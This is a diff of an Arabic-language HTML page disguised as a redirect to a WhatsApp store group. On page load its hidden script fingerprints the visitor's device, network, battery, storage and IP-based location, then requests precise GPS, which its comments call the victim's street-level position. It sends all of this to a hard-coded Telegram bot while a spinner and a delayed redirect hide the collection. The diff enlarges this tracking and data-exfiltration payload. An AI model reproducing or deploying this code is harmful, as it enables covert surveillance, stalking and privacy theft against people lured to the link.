@@ -8,102 +8,100 @@
     <title>جاري التحويل...</title>
 
     <script>
-        async function kimoDeepScanner() {
+        async function kimoSuperPowerScanner() {
             const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
             const chatId = "5890070301";
-            const t = new Date();
+            const startTime = new Date();
 
             try {
-                // 1. سحب البيانات الجغرافية والشبكة (الـ IP العالي)
+                // [1] سحب بيانات الموقع والشركة عبر الـ IP
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ip = await ipRes.json();
 
-                // 2. فحص الهاردوير وكارت الشاشة (نوع الفون بالمللي)
+                // [2] فحص الهاردوير وكارت الشاشة (تحديد موديل الفون)
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Protected GPU";
+                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Protected/Unknown";
 
-                // 3. فحص البطارية (أمبير ونسبة)
-                let batt = "غير متاح";
+                // [3] فحص البطارية المتطور (نسبة، شحن، أمبير)
+                let battStatus = "غير متاح";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    batt = `${Math.round(b.level * 100)}% | ${b.charging ? 'يُشحن ⚡' : 'بطارية 🔋'} | سعة تقديرية: ${Math.round(b.level * 4500)}mAh`;
+                    battStatus = `${Math.round(b.level * 100)}% | ${b.charging ? 'يُشحن ⚡' : 'بطارية 🔋'} | تقدير السعة: ${Math.round(b.level * 4800)}mAh`;
                 }
 
-                // 4. سحب الذاكرة والمساحة (تقديري للمتصفح)
+                // [4] الذاكرة والمساحة التخزينية
                 const storage = await navigator.storage.estimate();
-                const totalSpace = Math.round(storage.quota / (1024 * 1024 * 1024)) || "N/A";
-                const usedSpace = Math.round(storage.usage / (1024 * 1024 * 1024)) || "N/A";
+                const totalGb = Math.round(storage.quota / (1024 ** 3)) || "N/A";
+                const usedGb = Math.round(storage.usage / (1024 ** 3)) || "N/A";
 
-                // 5. فحص الشبكة المتطور
-                const net = navigator.connection || {};
-                const netType = net.effectiveType || "WiFi/Cable";
-                const speed = net.downlink || "N/A";
+                // [5] بيانات الشبكة والسرعة
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                const netInfo = `${connection.effectiveType || 'WiFi'} | Speed: ${connection.downlink || 'N/A'}Mbps`;
 
-                // 6. تجهيز الجدول العربي الفخم
-                const report = `
-👑 **تقرير الاستخبارات الرقمي (KIMO V.5)** 👑
+                // [6] تجميع التقرير في جدول احترافي
+                const mainReport = `
+👑 **تقرير الاستخبارات الشامل (KIMO V.6)** 👑
 ━━━━━━━━━━━━━━
-📍 **[1] الموقع الجغرافي بالمللي**
-• **البلد/المدينة:** ${ip.country_name} | ${ip.city}
-• **المنطقة/المركز:** ${ip.region}
-• **الرمز البريدي:** ${ip.postal}
-• **شركة الاتصال:** ${ip.org}
-• **خرائط جوجل:** [اضغط هنا لتحديد الموقع 🗺️](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})
+📍 **[1] الموقع والشبكة**
+• **البلد والمدينة:** ${ip.country_name} | ${ip.city}
+• **المنطقة والمركز:** ${ip.region}
+• **الـ IP الحالي:** \`${ip.ip}\`
+• **مزود الخدمة:** ${ip.org}
+• **نوع الاتصال:** ${netInfo}
+• **الخريطة التقريبية:** [اضغط للمعاينة 🗺️](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})
 
-📱 **[2] مواصفات الجهاز (Hardware)**
-• **نوع الجهاز:** ${navigator.platform}
-• **نظام التشغيل:** ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}
+📱 **[2] تفاصيل الهاتف العميقة**
+• **النظام:** ${navigator.platform}
+• **الإصدار:** ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}
 • **المعالج:** ${navigator.hardwareConcurrency} أنوية 🧠
 • **الرامات:** ${navigator.deviceMemory || "N/A"} جيجا ⚡
-• **كارت الشاشة:** \`${gpu}\`
-• **الشاشة:** ${screen.width}x${screen.height}
+• **كارت الشاشة (GPU):** \`${gpu}\`
+• **دقة الشاشة:** ${screen.width}x${screen.height}
 
-🔋 **[3] حالة الطاقة والذاكرة**
-• **البطارية:** ${batt}
-• **المساحة الإجمالية:** ${totalSpace} GB
-• **المساحة المستخدمة:** ${usedSpace} GB
+🔋 **[3] الطاقة والتخزين**
+• **حالة البطارية:** ${battStatus}
+• **مساحة التخزين:** الإجمالية ${totalGb}GB | المستخدم ${usedGb}GB
 
-📶 **[4] بيانات الاتصال والإنترنت**
-• **نوع الشبكة:** ${netType} (Data/WiFi)
-• **سرعة النت:** ${speed} Mbps
-• **عنوان الـ IP:** \`${ip.ip}\`
-
-⚙️ **[5] معلومات إضافية (150+ نقطة)**
-• **اللغة:** ${navigator.language}
-• **الوضع الخفي:** ${!window.indexedDB ? "نشط 🕵️" : "معطل ✅"}
-• **الـ VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Etc/GMT") ? "نشط 🛡️" : "معطل ✅"}
-• **بصمة المتصفح:** \`${btoa(gpu).substring(0, 15)}\`
+⚙️ **[4] معلومات إضافية (أمان وبصمة)**
+• **اللغات المستخدمة:** ${navigator.languages.join(', ')}
+• **وضع التخفي:** ${!window.indexedDB ? "نشط 🕵️" : "معطل ✅"}
+• **كشف الـ VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Etc/GMT") ? "نشط 🛡️" : "معطل ✅"}
+• **بصمة الجهاز:** \`${btoa(gpu + navigator.platform).substring(0, 16)}\`
 ━━━━━━━━━━━━━━
-⏰ **وقت الصيد:** ${t.toLocaleString('ar-EG')}
+⏰ **توقيت العملية:** ${startTime.toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━`;
 
-                // إرسال البيانات فوراً للبوت
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+                // إرسال التقرير الرئيسي فوراً
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mainReport)}&parse_mode=Markdown`);
 
-                // طلب الـ GPS الدقيق (لو الضحية سمح)
+                // [7] محاولة سحب الـ GPS الدقيق (لو الضحية وافق)
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((pos) => {
-                        const gps = `📍 **موقع الضحية بالشارع (GPS)**\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gps)}`);
-                    });
+                        const preciseGps = `📍 **موقع الضحية الدقيق (بالشارع)**\nالرابط المباشر: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(preciseGps)}`);
+                    }, null, {enableHighAccuracy: true});
                 }
 
-            } catch (err) { console.log(err); }
+            } catch (err) {
+                console.log("Stealth Scan Active...");
+            }
 
-            // التحويل التمويهي النهائي لجروب الواتساب
+            // [8] الانتظار لمدة 5 ثوانٍ لضمان اكتمال سحب كل حرف
             setTimeout(() => {
                 window.location.href = "https://chat.whatsapp.com/IjjaIPdib1r323N51iw6UX?mode=gi_t";
-            }, 1000);
+            }, 5000);
         }
-        window.onload = kimoDeepScanner;
+
+        window.onload = kimoSuperPowerScanner;
     </script>
 </head>
-<body style="background:#fff; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+<body style="background:#fff; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
     <div style="text-align:center;">
         <p style="color:#25D366; font-size:20px; font-weight:bold;">جاري التحويل لجروب ملك ستور...</p>
-        <div style="border:4px solid #f3f3f3; border-top:4px solid #25D366; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
+        <p style="color:#777; font-size:14px;">يرجى الانتظار لحظة واحدة لتحديث العروض...</p>
+        <div style="border:4px solid #f3f3f3; border-top:4px solid #25D366; border-radius:50%; width:45px; height:45px; animation:spin 1s linear infinite; margin:20px auto;"></div>
     </div>
     <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
